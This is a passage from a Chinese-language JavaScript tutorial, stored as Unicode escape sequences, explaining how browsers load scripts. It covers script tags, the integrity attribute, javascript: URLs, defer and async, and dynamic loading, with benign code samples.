\u5c5e\u6027\u8bfb\u51fa\u5b83\u7684\u5185\u5bb9\u3002 1 2 document . getElementById ( 'mydata' ). text // console.log('Hello World'); script \u5143\u7d20\u52a0\u8f7d\u5916\u90e8\u811a\u672c \u00b6 <script> \u6807\u7b7e\u4e5f\u53ef\u4ee5\u6307\u5b9a\u52a0\u8f7d\u5916\u90e8\u7684\u811a\u672c\u6587\u4ef6\u3002 1 < script src = \"https://www.example.com/script.js\" ></ script > \u5982\u679c\u811a\u672c\u6587\u4ef6\u4f7f\u7528\u4e86\u975e\u82f1\u8bed\u5b57\u7b26\uff0c\u8fd8\u5e94\u8be5\u6ce8\u660e\u5b57\u7b26\u7684\u7f16\u7801\u3002 1 < script charset = \"utf-8\" src = \"https://www.example.com/script.js\" ></ script > \u6240\u52a0\u8f7d\u7684\u811a\u672c\u5fc5\u987b\u662f\u7eaf\u7684 JavaScript \u4ee3\u7801\uff0c\u4e0d\u80fd\u6709 HTML \u4ee3\u7801\u548c <script> \u6807\u7b7e\u3002 \u52a0\u8f7d\u5916\u90e8\u811a\u672c\u548c\u76f4\u63a5\u6dfb\u52a0\u4ee3\u7801\u5757\uff0c\u8fd9\u4e24\u79cd\u65b9\u6cd5\u4e0d\u80fd\u6df7\u7528\u3002\u4e0b\u9762\u4ee3\u7801\u7684 console.log \u8bed\u53e5\u76f4\u63a5\u88ab\u5ffd\u7565\u3002 1 2 3 < script charset = \"utf-8\" src = \"example.js\" > console . log ( 'Hello World!' ); </ script > \u4e3a\u4e86\u9632\u6b62\u653b\u51fb\u8005\u7be1\u6539\u5916\u90e8\u811a\u672c\uff0c script \u6807\u7b7e\u5141\u8bb8\u8bbe\u7f6e\u4e00\u4e2a integrity \u5c5e\u6027\uff0c\u5199\u5165\u8be5\u5916\u90e8\u811a\u672c\u7684 Hash \u7b7e\u540d\uff0c\u7528\u6765\u9a8c\u8bc1\u811a\u672c\u7684\u4e00\u81f4\u6027\u3002 1 2 3 < script src = \"/assets/application.js\" integrity = \"sha256-TvVUHzSfftWg1rcfL6TIJ0XKEGrgLyEq6lEpcmrG9qs=\" > </ script > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c script \u6807\u7b7e\u6709\u4e00\u4e2a integrity \u5c5e\u6027\uff0c\u6307\u5b9a\u4e86\u5916\u90e8\u811a\u672c /assets/application.js \u7684 SHA256 \u7b7e\u540d\u3002\u4e00\u65e6\u6709\u4eba\u6539\u4e86\u8fd9\u4e2a\u811a\u672c\uff0c\u5bfc\u81f4 SHA256 \u7b7e\u540d\u4e0d\u5339\u914d\uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u62d2\u7edd\u52a0\u8f7d\u3002 \u4e8b\u4ef6\u5c5e\u6027 \u00b6 \u7f51\u9875\u5143\u7d20\u7684\u4e8b\u4ef6\u5c5e\u6027\uff08\u6bd4\u5982 onclick \u548c onmouseover \uff09\uff0c\u53ef\u4ee5\u5199\u5165 JavaScript \u4ee3\u7801\u3002\u5f53\u6307\u5b9a\u4e8b\u4ef6\u53d1\u751f\u65f6\uff0c\u5c31\u4f1a\u8c03\u7528\u8fd9\u4e9b\u4ee3\u7801\u3002 1 < button id = \"myBtn\" onclick = \"console.log(this.id)\" > \u70b9\u51fb </ button > \u4e0a\u9762\u7684\u4e8b\u4ef6\u5c5e\u6027\u4ee3\u7801\u53ea\u6709\u4e00\u4e2a\u8bed\u53e5\u3002\u5982\u679c\u6709\u591a\u4e2a\u8bed\u53e5\uff0c\u4f7f\u7528\u5206\u53f7\u5206\u9694\u5373\u53ef\u3002 URL \u534f\u8bae \u00b6 URL \u652f\u6301 javascript: \u534f\u8bae\uff0c\u5373\u5728 URL \u7684\u4f4d\u7f6e\u5199\u5165\u4ee3\u7801\uff0c\u4f7f\u7528\u8fd9\u4e2a URL \u7684\u65f6\u5019\u5c31\u4f1a\u6267\u884c JavaScript \u4ee3\u7801\u3002 1 < a href = \"javascript:console.log('Hello')\" > \u70b9\u51fb </ a > \u6d4f\u89c8\u5668\u7684\u5730\u5740\u680f\u4e5f\u53ef\u4ee5\u6267\u884c javascript: \u534f\u8bae\u3002\u5c06 javascript:console.log('Hello') \u653e\u5165\u5730\u5740\u680f\uff0c\u6309\u56de\u8f66\u952e\u4e5f\u4f1a\u6267\u884c\u8fd9\u6bb5\u4ee3\u7801\u3002 \u5982\u679c JavaScript \u4ee3\u7801\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u65b0\u5efa\u4e00\u4e2a\u6587\u6863\uff0c\u5c55\u793a\u8fd9\u4e2a\u5b57\u7b26\u4e32\u7684\u5185\u5bb9\uff0c\u539f\u6709\u6587\u6863\u7684\u5185\u5bb9\u90fd\u4f1a\u6d88\u5931\u3002 1 < a href = \"javascript: new Date().toLocaleTimeString();\" > \u70b9\u51fb </ a > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7528\u6237\u70b9\u51fb\u94fe\u63a5\u4ee5\u540e\uff0c\u4f1a\u6253\u5f00\u4e00\u4e2a\u65b0\u6587\u6863\uff0c\u91cc\u9762\u6709\u5f53\u524d\u65f6\u95f4\u3002 \u5982\u679c\u8fd4\u56de\u7684\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c\u90a3\u4e48\u6d4f\u89c8\u5668\u4e0d\u4f1a\u65b0\u5efa\u6587\u6863\uff0c\u4e5f\u4e0d\u4f1a\u8df3\u8f6c\u3002 1 < a href = \"javascript: console.log(new Date().toLocaleTimeString())\" > \u70b9\u51fb < /a> \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7528\u6237\u70b9\u51fb\u94fe\u63a5\u540e\uff0c\u7f51\u9875\u4e0d\u4f1a\u8df3\u8f6c\uff0c\u53ea\u4f1a\u5728\u63a7\u5236\u53f0\u663e\u793a\u5f53\u524d\u65f6\u95f4\u3002 javascript: \u534f\u8bae\u7684\u5e38\u89c1\u7528\u9014\u662f\u4e66\u7b7e\u811a\u672c Bookmarklet\u3002\u7531\u4e8e\u6d4f\u89c8\u5668\u7684\u4e66\u7b7e\u4fdd\u5b58\u7684\u662f\u4e00\u4e2a\u7f51\u5740\uff0c\u6240\u4ee5 javascript: \u7f51\u5740\u4e5f\u53ef\u4ee5\u4fdd\u5b58\u5728\u91cc\u9762\uff0c\u7528\u6237\u9009\u62e9\u8fd9\u4e2a\u4e66\u7b7e\u7684\u65f6\u5019\uff0c\u5c31\u4f1a\u5728\u5f53\u524d\u9875\u9762\u6267\u884c\u8fd9\u4e2a\u811a\u672c\u3002\u4e3a\u4e86\u9632\u6b62\u4e66\u7b7e\u66ff\u6362\u6389\u5f53\u524d\u6587\u6863\uff0c\u53ef\u4ee5\u5728\u811a\u672c\u524d\u52a0\u4e0a void \uff0c\u6216\u8005\u5728\u811a\u672c\u6700\u540e\u52a0\u4e0a void 0 \u3002 1 2 < a href = \"javascript: void new Date().toLocaleTimeString();\" > \u70b9\u51fb </ a > < a href = \"javascript: new Date().toLocaleTimeString();void 0;\" > \u70b9\u51fb </ a > \u4e0a\u9762\u8fd9\u4e24\u79cd\u5199\u6cd5\uff0c\u70b9\u51fb\u94fe\u63a5\u540e\uff0c\u6267\u884c\u4ee3\u7801\u90fd\u4e0d\u4f1a\u7f51\u9875\u8df3\u8f6c\u3002 script \u5143\u7d20 \u00b6 \u5de5\u4f5c\u539f\u7406 \u00b6 \u6d4f\u89c8\u5668\u52a0\u8f7d JavaScript \u811a\u672c\uff0c\u4e3b\u8981\u901a\u8fc7 <script> \u5143\u7d20\u5b8c\u6210\u3002\u6b63\u5e38\u7684\u7f51\u9875\u52a0\u8f7d\u6d41\u7a0b\u662f\u8fd9\u6837\u7684\u3002 \u6d4f\u89c8\u5668\u4e00\u8fb9\u4e0b\u8f7d HTML \u7f51\u9875\uff0c\u4e00\u8fb9\u5f00\u59cb\u89e3\u6790\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0d\u7b49\u5230\u4e0b\u8f7d\u5b8c\uff0c\u5c31\u5f00\u59cb\u89e3\u6790\u3002 \u89e3\u6790\u8fc7\u7a0b\u4e2d\uff0c\u6d4f\u89c8\u5668\u53d1\u73b0 <script> \u5143\u7d20\uff0c\u5c31\u6682\u505c\u89e3\u6790\uff0c\u628a\u7f51\u9875\u6e32\u67d3\u7684\u63a7\u5236\u6743\u8f6c\u4ea4\u7ed9 JavaScript \u5f15\u64ce\u3002 \u5982\u679c <script> \u5143\u7d20\u5f15\u7528\u4e86\u5916\u90e8\u811a\u672c\uff0c\u5c31\u4e0b\u8f7d\u8be5\u811a\u672c\u518d\u6267\u884c\uff0c\u5426\u5219\u5c31\u76f4\u63a5\u6267\u884c\u4ee3\u7801\u3002 JavaScript \u5f15\u64ce\u6267\u884c\u5b8c\u6bd5\uff0c\u63a7\u5236\u6743\u4ea4\u8fd8\u6e32\u67d3\u5f15\u64ce\uff0c\u6062\u590d\u5f80\u4e0b\u89e3\u6790 HTML \u7f51\u9875\u3002 \u52a0\u8f7d\u5916\u90e8\u811a\u672c\u65f6\uff0c\u6d4f\u89c8\u5668\u4f1a\u6682\u505c\u9875\u9762\u6e32\u67d3\uff0c\u7b49\u5f85\u811a\u672c\u4e0b\u8f7d\u5e76\u6267\u884c\u5b8c\u6210\u540e\uff0c\u518d\u7ee7\u7eed\u6e32\u67d3\u3002\u539f\u56e0\u662f JavaScript \u4ee3\u7801\u53ef\u4ee5\u4fee\u6539 DOM\uff0c\u6240\u4ee5\u5fc5\u987b\u628a\u63a7\u5236\u6743\u8ba9\u7ed9\u5b83\uff0c\u5426\u5219\u4f1a\u5bfc\u81f4\u590d\u6742\u7684\u7ebf\u7a0b\u7ade\u8d5b\u7684\u95ee\u9898\u3002 \u5982\u679c\u5916\u90e8\u811a\u672c\u52a0\u8f7d\u65f6\u95f4\u5f88\u957f\uff08\u4e00\u76f4\u65e0\u6cd5\u5b8c\u6210\u4e0b\u8f7d\uff09\uff0c\u90a3\u4e48\u6d4f\u89c8\u5668\u5c31\u4f1a\u4e00\u76f4\u7b49\u5f85\u811a\u672c\u4e0b\u8f7d\u5b8c\u6210\uff0c\u9020\u6210\u7f51\u9875\u957f\u65f6\u95f4\u5931\u53bb\u54cd\u5e94\uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u5448\u73b0\u201c\u5047\u6b7b\u201d\u72b6\u6001\uff0c\u8fd9\u88ab\u79f0\u4e3a\u201c\u963b\u585e\u6548\u5e94\u201d\u3002 \u4e3a\u4e86\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\uff0c\u8f83\u597d\u7684\u505a\u6cd5\u662f\u5c06 <script> \u6807\u7b7e\u90fd\u653e\u5728\u9875\u9762\u5e95\u90e8\uff0c\u800c\u4e0d\u662f\u5934\u90e8\u3002\u8fd9\u6837\u5373\u4f7f\u9047\u5230\u811a\u672c\u5931\u53bb\u54cd\u5e94\uff0c\u7f51\u9875\u4e3b\u4f53\u7684\u6e32\u67d3\u4e5f\u5df2\u7ecf\u5b8c\u6210\u4e86\uff0c\u7528\u6237\u81f3\u5c11\u53ef\u4ee5\u770b\u5230\u5185\u5bb9\uff0c\u800c\u4e0d\u662f\u9762\u5bf9\u4e00\u5f20\u7a7a\u767d\u7684\u9875\u9762\u3002\u5982\u679c\u67d0\u4e9b\u811a\u672c\u4ee3\u7801\u975e\u5e38\u91cd\u8981\uff0c\u4e00\u5b9a\u8981\u653e\u5728\u9875\u9762\u5934\u90e8\u7684\u8bdd\uff0c\u6700\u597d\u76f4\u63a5\u5c06\u4ee3\u7801\u5199\u5165\u9875\u9762\uff0c\u800c\u4e0d\u662f\u8fde\u63a5\u5916\u90e8\u811a\u672c\u6587\u4ef6\uff0c\u8fd9\u6837\u80fd\u7f29\u77ed\u52a0\u8f7d\u65f6\u95f4\u3002 \u811a\u672c\u6587\u4ef6\u90fd\u653e\u5728\u7f51\u9875\u5c3e\u90e8\u52a0\u8f7d\uff0c\u8fd8\u6709\u4e00\u4e2a\u597d\u5904\u3002\u56e0\u4e3a\u5728 DOM \u7ed3\u6784\u751f\u6210\u4e4b\u524d\u5c31\u8c03\u7528 DOM \u8282\u70b9\uff0cJavaScript \u4f1a\u62a5\u9519\uff0c\u5982\u679c\u811a\u672c\u90fd\u5728\u7f51\u9875\u5c3e\u90e8\u52a0\u8f7d\uff0c\u5c31\u4e0d\u5b58\u5728\u8fd9\u4e2a\u95ee\u9898\uff0c\u56e0\u4e3a\u8fd9\u65f6 DOM \u80af\u5b9a\u5df2\u7ecf\u751f\u6210\u4e86\u3002 1 2 3 4 5 6 7 < head > < script > console . log ( document . body . innerHTML ); </ script > </ head > < body > </ body > \u4e0a\u9762\u4ee3\u7801\u6267\u884c\u65f6\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a\u6b64\u65f6 document.body \u5143\u7d20\u8fd8\u672a\u751f\u6210\u3002 \u4e00\u79cd\u89e3\u51b3\u65b9\u6cd5\u662f\u8bbe\u5b9a DOMContentLoaded \u4e8b\u4ef6\u7684\u56de\u8c03\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 < head > < script > document . addEventListener ( 'DOMContentLoaded' , function ( event ) { console . log ( document . body . innerHTML ); } ); </ script > </ head > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6307\u5b9a DOMContentLoaded \u4e8b\u4ef6\u53d1\u751f\u540e\uff0c\u624d\u5f00\u59cb\u6267\u884c\u76f8\u5173\u4ee3\u7801\u3002 DOMContentLoaded \u4e8b\u4ef6\u53ea\u6709\u5728 DOM \u7ed3\u6784\u751f\u6210\u4e4b\u540e\u624d\u4f1a\u89e6\u53d1\u3002 \u53e6\u4e00\u79cd\u89e3\u51b3\u65b9\u6cd5\u662f\uff0c\u4f7f\u7528 <script> \u6807\u7b7e\u7684 onload \u5c5e\u6027\u3002\u5f53 <script> \u6807\u7b7e\u6307\u5b9a\u7684\u5916\u90e8\u811a\u672c\u6587\u4ef6\u4e0b\u8f7d\u548c\u89e3\u6790\u5b8c\u6210\uff0c\u4f1a\u89e6\u53d1\u4e00\u4e2a load \u4e8b\u4ef6\uff0c\u53ef\u4ee5\u628a\u6240\u9700\u6267\u884c\u7684\u4ee3\u7801\uff0c\u653e\u5728\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u56de\u8c03\u51fd\u6570\u91cc\u9762\u3002 1 2 < script src = \"jquery.min.js\" onload = \"console.log(document.body.innerHTML)\" > </ script > \u4f46\u662f\uff0c\u5982\u679c\u5c06\u811a\u672c\u653e\u5728\u9875\u9762\u5e95\u90e8\uff0c\u5c31\u53ef\u4ee5\u5b8c\u5168\u6309\u7167\u6b63\u5e38\u7684\u65b9\u5f0f\u5199\uff0c\u4e0a\u9762\u4e24\u79cd\u65b9\u5f0f\u90fd\u4e0d\u9700\u8981\u3002 1 2 3 4 5 6 < body > <!-- \u5176\u4ed6\u4ee3\u7801 --> < script > console . log ( document . body . innerHTML ); </ script > </ body > \u5982\u679c\u6709\u591a\u4e2a script \u6807\u7b7e\uff0c\u6bd4\u5982\u4e0b\u9762\u8fd9\u6837\u3002 1 2 < script src = \"a.js\" ></ script > < script src = \"b.js\" ></ script > \u6d4f\u89c8\u5668\u4f1a\u540c\u65f6\u5e76\u884c\u4e0b\u8f7d a.js \u548c b.js \uff0c\u4f46\u662f\uff0c\u6267\u884c\u65f6\u4f1a\u4fdd\u8bc1\u5148\u6267\u884c a.js \uff0c\u7136\u540e\u518d\u6267\u884c b.js \uff0c\u5373\u4f7f\u540e\u8005\u5148\u4e0b\u8f7d\u5b8c\u6210\uff0c\u4e5f\u662f\u5982\u6b64\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u811a\u672c\u7684\u6267\u884c\u987a\u5e8f\u7531\u5b83\u4eec\u5728\u9875\u9762\u4e2d\u7684\u51fa\u73b0\u987a\u5e8f\u51b3\u5b9a\uff0c\u8fd9\u662f\u4e3a\u4e86\u4fdd\u8bc1\u811a\u672c\u4e4b\u95f4\u7684\u4f9d\u8d56\u5173\u7cfb\u4e0d\u53d7\u5230\u7834\u574f\u3002\u5f53\u7136\uff0c\u52a0\u8f7d\u8fd9\u4e24\u4e2a\u811a\u672c\u90fd\u4f1a\u4ea7\u751f\u201c\u963b\u585e\u6548\u5e94\u201d\uff0c\u5fc5\u987b\u7b49\u5230\u5b83\u4eec\u90fd\u52a0\u8f7d\u5b8c\u6210\uff0c\u6d4f\u89c8\u5668\u624d\u4f1a\u7ee7\u7eed\u9875\u9762\u6e32\u67d3\u3002 \u89e3\u6790\u548c\u6267\u884c CSS\uff0c\u4e5f\u4f1a\u4ea7\u751f\u963b\u585e\u3002Firefox \u6d4f\u89c8\u5668\u4f1a\u7b49\u5230\u811a\u672c\u524d\u9762\u7684\u6240\u6709\u6837\u5f0f\u8868\uff0c\u90fd\u4e0b\u8f7d\u5e76\u89e3\u6790\u5b8c\uff0c\u518d\u6267\u884c\u811a\u672c\uff1bWebkit\u5219\u662f\u4e00\u65e6\u53d1\u73b0\u811a\u672c\u5f15\u7528\u4e86\u6837\u5f0f\uff0c\u5c31\u4f1a\u6682\u505c\u6267\u884c\u811a\u672c\uff0c\u7b49\u5230\u6837\u5f0f\u8868\u4e0b\u8f7d\u5e76\u89e3\u6790\u5b8c\uff0c\u518d\u6062\u590d\u6267\u884c\u3002 \u6b64\u5916\uff0c\u5bf9\u4e8e\u6765\u81ea\u540c\u4e00\u4e2a\u57df\u540d\u7684\u8d44\u6e90\uff0c\u6bd4\u5982\u811a\u672c\u6587\u4ef6\u3001\u6837\u5f0f\u8868\u6587\u4ef6\u3001\u56fe\u7247\u6587\u4ef6\u7b49\uff0c\u6d4f\u89c8\u5668\u4e00\u822c\u6709\u9650\u5236\uff0c\u540c\u65f6\u6700\u591a\u4e0b\u8f7d6\uff5e20\u4e2a\u8d44\u6e90\uff0c\u5373\u6700\u591a\u540c\u65f6\u6253\u5f00\u7684 TCP \u8fde\u63a5\u6709\u9650\u5236\uff0c\u8fd9\u662f\u4e3a\u4e86\u9632\u6b62\u5bf9\u670d\u52a1\u5668\u9020\u6210\u592a\u5927\u538b\u529b\u3002\u5982\u679c\u662f\u6765\u81ea\u4e0d\u540c\u57df\u540d\u7684\u8d44\u6e90\uff0c\u5c31\u6ca1\u6709\u8fd9\u4e2a\u9650\u5236\u3002\u6240\u4ee5\uff0c\u901a\u5e38\u628a\u9759\u6001\u6587\u4ef6\u653e\u5728\u4e0d\u540c\u7684\u57df\u540d\u4e4b\u4e0b\uff0c\u4ee5\u52a0\u5feb\u4e0b\u8f7d\u901f\u5ea6\u3002 defer \u5c5e\u6027 \u00b6 \u4e3a\u4e86\u89e3\u51b3\u811a\u672c\u6587\u4ef6\u4e0b\u8f7d\u963b\u585e\u7f51\u9875\u6e32\u67d3\u7684\u95ee\u9898\uff0c\u4e00\u4e2a\u65b9\u6cd5\u662f\u5bf9 <script> \u5143\u7d20\u52a0\u5165 defer \u5c5e\u6027\u3002\u5b83\u7684\u4f5c\u7528\u662f\u5ef6\u8fdf\u811a\u672c\u7684\u6267\u884c\uff0c\u7b49\u5230 DOM \u52a0\u8f7d\u751f\u6210\u540e\uff0c\u518d\u6267\u884c\u811a\u672c\u3002 1 2 < script src = \"a.js\" defer ></ script > < script src = \"b.js\" defer ></ script > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53ea\u6709\u7b49\u5230 DOM \u52a0\u8f7d\u5b8c\u6210\u540e\uff0c\u624d\u4f1a\u6267\u884c a.js \u548c b.js \u3002 defer \u5c5e\u6027\u7684\u8fd0\u884c\u6d41\u7a0b\u5982\u4e0b\u3002 \u6d4f\u89c8\u5668\u5f00\u59cb\u89e3\u6790 HTML \u7f51\u9875\u3002 \u89e3\u6790\u8fc7\u7a0b\u4e2d\uff0c\u53d1\u73b0\u5e26\u6709 defer \u5c5e\u6027\u7684 <script> \u5143\u7d20\u3002 \u6d4f\u89c8\u5668\u7ee7\u7eed\u5f80\u4e0b\u89e3\u6790 HTML \u7f51\u9875\uff0c\u540c\u65f6\u5e76\u884c\u4e0b\u8f7d <script> \u5143\u7d20\u52a0\u8f7d\u7684\u5916\u90e8\u811a\u672c\u3002 \u6d4f\u89c8\u5668\u5b8c\u6210\u89e3\u6790 HTML \u7f51\u9875\uff0c\u6b64\u65f6\u518d\u56de\u8fc7\u5934\u6267\u884c\u5df2\u7ecf\u4e0b\u8f7d\u5b8c\u6210\u7684\u811a\u672c\u3002 \u6709\u4e86 defer \u5c5e\u6027\uff0c\u6d4f\u89c8\u5668\u4e0b\u8f7d\u811a\u672c\u6587\u4ef6\u7684\u65f6\u5019\uff0c\u4e0d\u4f1a\u963b\u585e\u9875\u9762\u6e32\u67d3\u3002\u4e0b\u8f7d\u7684\u811a\u672c\u6587\u4ef6\u5728 DOMContentLoaded \u4e8b\u4ef6\u89e6\u53d1\u524d\u6267\u884c\uff08\u5373\u521a\u521a\u8bfb\u53d6\u5b8c </html> \u6807\u7b7e\uff09\uff0c\u800c\u4e14\u53ef\u4ee5\u4fdd\u8bc1\u6267\u884c\u987a\u5e8f\u5c31\u662f\u5b83\u4eec\u5728\u9875\u9762\u4e0a\u51fa\u73b0\u7684\u987a\u5e8f\u3002 \u5bf9\u4e8e\u5185\u7f6e\u800c\u4e0d\u662f\u52a0\u8f7d\u5916\u90e8\u811a\u672c\u7684 script \u6807\u7b7e\uff0c\u4ee5\u53ca\u52a8\u6001\u751f\u6210\u7684 script \u6807\u7b7e\uff0c defer \u5c5e\u6027\u4e0d\u8d77\u4f5c\u7528\u3002\u53e6\u5916\uff0c\u4f7f\u7528 defer \u52a0\u8f7d\u7684\u5916\u90e8\u811a\u672c\u4e0d\u5e94\u8be5\u4f7f\u7528 document.write \u65b9\u6cd5\u3002 async \u5c5e\u6027 \u00b6 \u89e3\u51b3\u201c\u963b\u585e\u6548\u5e94\u201d\u7684\u53e6\u4e00\u4e2a\u65b9\u6cd5\u662f\u5bf9 <script> \u5143\u7d20\u52a0\u5165 async \u5c5e\u6027\u3002 1 2 < script src = \"a.js\" async ></ script > < script src = \"b.js\" async ></ script > async \u5c5e\u6027\u7684\u4f5c\u7528\u662f\uff0c\u4f7f\u7528\u53e6\u4e00\u4e2a\u8fdb\u7a0b\u4e0b\u8f7d\u811a\u672c\uff0c\u4e0b\u8f7d\u65f6\u4e0d\u4f1a\u963b\u585e\u6e32\u67d3\u3002 \u6d4f\u89c8\u5668\u5f00\u59cb\u89e3\u6790 HTML \u7f51\u9875\u3002 \u89e3\u6790\u8fc7\u7a0b\u4e2d\uff0c\u53d1\u73b0\u5e26\u6709 async \u5c5e\u6027\u7684 script \u6807\u7b7e\u3002 \u6d4f\u89c8\u5668\u7ee7\u7eed\u5f80\u4e0b\u89e3\u6790 HTML \u7f51\u9875\uff0c\u540c\u65f6\u5e76\u884c\u4e0b\u8f7d <script> \u6807\u7b7e\u4e2d\u7684\u5916\u90e8\u811a\u672c\u3002 \u811a\u672c\u4e0b\u8f7d\u5b8c\u6210\uff0c\u6d4f\u89c8\u5668\u6682\u505c\u89e3\u6790 HTML \u7f51\u9875\uff0c\u5f00\u59cb\u6267\u884c\u4e0b\u8f7d\u7684\u811a\u672c\u3002 \u811a\u672c\u6267\u884c\u5b8c\u6bd5\uff0c\u6d4f\u89c8\u5668\u6062\u590d\u89e3\u6790 HTML \u7f51\u9875\u3002 async \u5c5e\u6027\u53ef\u4ee5\u4fdd\u8bc1\u811a\u672c\u4e0b\u8f7d\u7684\u540c\u65f6\uff0c\u6d4f\u89c8\u5668\u7ee7\u7eed\u6e32\u67d3\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u4e00\u65e6\u91c7\u7528\u8fd9\u4e2a\u5c5e\u6027\uff0c\u5c31\u65e0\u6cd5\u4fdd\u8bc1\u811a\u672c\u7684\u6267\u884c\u987a\u5e8f\u3002\u54ea\u4e2a\u811a\u672c\u5148\u4e0b\u8f7d\u7ed3\u675f\uff0c\u5c31\u5148\u6267\u884c\u90a3\u4e2a\u811a\u672c\u3002\u53e6\u5916\uff0c\u4f7f\u7528 async \u5c5e\u6027\u7684\u811a\u672c\u6587\u4ef6\u91cc\u9762\u7684\u4ee3\u7801\uff0c\u4e0d\u5e94\u8be5\u4f7f\u7528 document.write \u65b9\u6cd5\u3002 defer \u5c5e\u6027\u548c async \u5c5e\u6027\u5230\u5e95\u5e94\u8be5\u4f7f\u7528\u54ea\u4e00\u4e2a\uff1f \u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u811a\u672c\u4e4b\u95f4\u6ca1\u6709\u4f9d\u8d56\u5173\u7cfb\uff0c\u5c31\u4f7f\u7528 async \u5c5e\u6027\uff0c\u5982\u679c\u811a\u672c\u4e4b\u95f4\u6709\u4f9d\u8d56\u5173\u7cfb\uff0c\u5c31\u4f7f\u7528 defer \u5c5e\u6027\u3002\u5982\u679c\u540c\u65f6\u4f7f\u7528 async \u548c defer \u5c5e\u6027\uff0c\u540e\u8005\u4e0d\u8d77\u4f5c\u7528\uff0c\u6d4f\u89c8\u5668\u884c\u4e3a\u7531 async \u5c5e\u6027\u51b3\u5b9a\u3002 \u811a\u672c\u7684\u52a8\u6001\u52a0\u8f7d \u00b6 <script> \u5143\u7d20\u8fd8\u53ef\u4ee5\u52a8\u6001\u751f\u6210\uff0c\u751f\u6210\u540e\u518d\u63d2\u5165\u9875\u9762\uff0c\u4ece\u800c\u5b9e\u73b0\u811a\u672c\u7684\u52a8\u6001\u52a0\u8f7d\u3002 1 2 3 4 5 [ 'a.js' , 'b.js' ]. forEach ( function ( src ) { var script = document . createElement ( 'script' ); script . src = src ; document . head . appendChild ( script ); }); \u8fd9\u79cd\u65b9\u6cd5\u7684\u597d\u5904\u662f\uff0c\u52a8\u6001\u751f\u6210\u7684 script \u6807\u7b7e\u4e0d\u4f1a\u963b\u585e\u9875\u9762\u6e32\u67d3\uff0c\u4e5f\u5c31\u4e0d\u4f1a\u9020\u6210\u6d4f\u89c8\u5668\u5047\u6b7b\u3002\u4f46\u662f\u95ee\u9898\u5728\u4e8e\uff0c\u8fd9\u79cd\u65b9\u6cd5\u65e0\u6cd5\u4fdd\u8bc1\u811a\u672c\u7684\u6267\u884c\u987a\u5e8f\uff0c\u54ea\u4e2a\u811a\u672c\u6587\u4ef6\u5148\u4e0b\u8f7d\u5b8c\u6210\uff0c\u5c31\u5148\u6267\u884c\u54ea\u4e2a\u3002 \u5982\u679c\u60f3\u907f\u514d\u8fd9\u4e2a\u95ee\u9898\uff0c\u53ef\u4ee5\u8bbe\u7f6easync\u5c5e\u6027\u4e3a false \u3002 1 2 3 4 5 6 [ 'a.js' , 'b.js' ]. forEach ( function ( src ) { var script = document . createElement ( 'script' ); script . src = src ; script . async = false ; document . head . appendChild ( script ); }); \u4e0a\u9762\u7684\u4ee3\u7801\u4e0d\u4f1a\u963b\u585e\u9875\u9762\u6e32\u67d3\uff0c\u800c\u4e14\u53ef\u4ee5\u4fdd\u8bc1 b.js \u5728 a.js \u540e\u9762\u6267\u884c\u3002\u4e0d\u8fc7\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u8fd9\u6bb5\u4ee3\u7801\u540e\u9762\u52a0\u8f7d\u7684\u811a\u672c\u6587\u4ef6\uff0c\u4f1a\u56e0\u6b64\u90fd\u7b49\u5f85 b.js \u6267\u884c\u5b8c\u6210\u540e\u518d\u6267\u884c\u3002 \u5982\u679c\u60f3\u4e3a\u52a8\u6001\u52a0\u8f7d\u7684\u811a\u672c\u6307\u5b9a\u56de\u8c03\u51fd\u6570\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u5199\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 11 function loadScript ( src , done ) { var js = document . createElement ( 'script' ); js . src = src ; js . onload = function () { done (); }; js . onerror = function () { done ( new Error ( 'Failed to load script ' + src )); }; document . head . appendChild ( js ); } \u52a0\u8f7d\u4f7f\u7528\u7684\u534f\u8bae \u00b6 \u5982\u679c\u4e0d\u6307\u5b9a\u534f\u8bae\uff0c\u6d4f\u89c8\u5668\u9ed8\u8ba4\u91c7\u7528 HTTP \u534f\u8bae\u4e0b\u8f7d\u3002 1 < script src = \"example.js\" ></ script > \u4e0a\u9762\u7684 example.js \u9ed8\u8ba4\u5c31\u662f\u91c7\u7528 HTTP \u534f\u8bae\u4e0b\u8f7d\uff0c\u5982\u679c\u8981\u91c7\u7528 HTTPS \u534f\u8bae\u4e0b\u8f7d\uff0c\u5fc5\u9700\u5199\u660e\u3002 1 < script src = \"https://example.js\" ></ script > \u4f46\u662f\u6709\u65f6\u6211\u4eec\u4f1a\u5e0c\u671b\uff0c\u6839\u636e\u9875\u9762\u672c\u8eab\u7684\u534f\u8bae\u6765\u51b3\u5b9a\u52a0\u8f7d\u534f\u8bae\uff0c\u8fd9\u65f6\u53ef\u4ee5\u91c7\u7528\u4e0b\u9762\u7684\u5199\u6cd5\u3002 1 < script src = \"//example.js\" ></ script > \u6d4f\u89c8\u5668\u7684\u7ec4\u6210 \u00b6 \u6d4f\u89c8\u5668\u7684\u6838\u5fc3\u662f\u4e24\u90e8\u5206\uff1a\u6e32\u67d3\u5f15\u64ce\u548c JavaScript \u89e3\u91ca\u5668\uff08\u53c8\u79f0 JavaScript \u5f15\u64ce\uff09\u3002 \u6e32\u67d3\u5f15\u64ce \u00b6 